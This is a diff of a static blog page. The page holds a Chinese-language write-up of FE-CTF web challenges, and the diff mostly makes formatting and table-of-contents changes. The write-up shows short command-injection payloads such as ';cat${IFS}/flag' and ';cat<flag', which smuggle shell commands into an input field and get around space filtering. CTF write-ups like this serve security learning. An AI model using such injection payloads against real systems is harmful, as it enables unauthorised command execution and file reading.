@@ -6,13 +6,11 @@
     <meta charset="utf-8">
     <meta name="keywords" content="FE-CTF, 学习记录">
     <meta name="description" content="
-
 赛后孤独复现。
-
 
 WebDig Host #1题目描述Heard you like digging, so why not dig for some flags?
 分析很简单的命令注入，题目没有对用户输入做任何过滤。
-payload;">
+payload;ls">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -494,30 +492,19 @@ payload;">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>赛后孤独复现。</p>
 <span id="more"></span>
-
 <h2 id="web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="dig-host-1"><a href="#Dig-Host-1" class="headerlink" title="Dig Host #1"></a>Dig Host #1</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Heard you like digging, so why not dig for some flags?</p>
 <h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>很简单的命令注入，题目没有对用户输入做任何过滤。</p>
 <h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-none"><code class="language-none">;ls &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="dig-host-2"><a href="#Dig-Host-2" class="headerlink" title="Dig Host #2"></a>Dig Host #2</h2><h4 id="题目描述"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>Seems like you are a digxpert! But can you keep up the phase?</p>
 <p><a target="_blank" rel="noopener" href="http://dig-host-2-web.hack.fe-ctf.dk/">dig-host-2-web.hack.fe-ctf.dk</a></p>
 <h4 id="分析"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>过滤了空格，直接用 <code>$&#123;IFS&#125;</code> 绕过。</p>
 <h4 id="payload"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-none"><code class="language-none">;cat$&#123;IFS&#125;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="dig-host-3"><a href="#Dig-Host-3" class="headerlink" title="Dig Host #3"></a>Dig Host #3</h2><h4 id="题目描述"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>Fine. This time, you will need more than a shovel to dig up the flag!</p>
 <p><a target="_blank" rel="noopener" href="http://dig-host-3-web.hack.fe-ctf.dk/">dig-host-3-web.hack.fe-ctf.dk</a></p>
 <h4 id="分析"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>过滤了空格，并且不能使用 <code>$&#123;IFS&#125;</code>。ls之后发现 flag 在当前目录下，可以利用重定向符号 cat 出 flag 的值。</p>
 <h4 id="payload"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-none"><code class="language-none">;cat&lt;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="hash-uppers-downers"><a href="#Hash-Uppers-Downers" class="headerlink" title="Hash Uppers Downers"></a>Hash Uppers Downers</h2><h4 id="题目描述"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>Go play: <code>nc uppers-downers.hack.fe-ctf.dk 1337</code></p>
 <h4 id="分析"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><h4 id="payload"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>官方discord地址：<a target="_blank" rel="noopener" href="https://discord.com/channels/1027192772828082247/1027205152966459402">https://discord.com/channels/1027192772828082247/1027205152966459402</a></p>
 
@@ -807,7 +794,6 @@ payload;">
                     <div class="summary block-with-text">
                         
                             
-
 SM4 分组密码算法是我国的一个商用密码算法。
                         
                     </div>
@@ -890,7 +876,7 @@ SM4 分组密码算法是我国的一个商用密码算法。
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -902,7 +888,7 @@ SM4 分组密码算法是我国的一个商用密码算法。
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1031,7 +1017,7 @@ SM4 分组密码算法是我国的一个商用密码算法。
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
